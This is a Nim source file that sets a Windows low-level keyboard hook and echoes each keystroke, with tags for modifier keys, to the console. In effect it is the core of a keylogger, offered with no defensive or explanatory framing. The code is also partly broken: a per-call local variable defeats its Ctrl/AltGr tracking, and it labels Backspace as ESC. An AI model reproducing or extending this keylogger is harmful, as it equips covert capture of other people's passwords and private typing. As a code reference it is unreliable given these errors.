import winim

proc keyboardHook(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.}=
  var last: int32
  var letter: bool = true
  if nCode == HC_ACTION:
    if wParam == WM_KEYDOWN or wParam == WM_SYSKEYDOWN:
      var p: PKBDLLHOOKSTRUCT = cast[PKBDLLHOOKSTRUCT](lParam)
      let code = p.vkCode
      if code == 0xA2: # LCTRL or first signal of RALT
        last = code
        return CallNextHookEx(cast[HHOOK](NULL), nCode,wParam, lParam)
      if last == 0xA2 and code == 0xA5: # RALT
        echo "<RALT>"
        letter = false
      elif last == 0xA2 and code != 0xA5:
        echo "<LCTRL>"
      if code == 0xA3:
        letter = false
        echo "<RCTRL>"
      if code == 0xA4:
        letter = false
        echo "<LALT>"
      if code == 0xA0:
        letter = false
        echo "<LSHIFT>"
      if code == 0xA1:
        letter = false
        echo "<RSHIFT>"
      if code == 0x08:
        letter = false
        echo "<ESC>"
      if code == 0x0D:
        letter = false
        echo "\n"
      last = code
      if letter:
        echo ($char(code))


proc main*() =
  var hInstance = GetModuleHandle(nil)
  var hook = SetWindowsHookEx(WH_KEYBOARD_LL.int32, keyboardHook, hInstance, 0)
  var msg: MSG
  while GetMessage(msg, 0, 0, 0) != 0:
    TranslateMessage(&msg)
    DispatchMessage(&msg)
  UnhookWindowsHookEx(hook)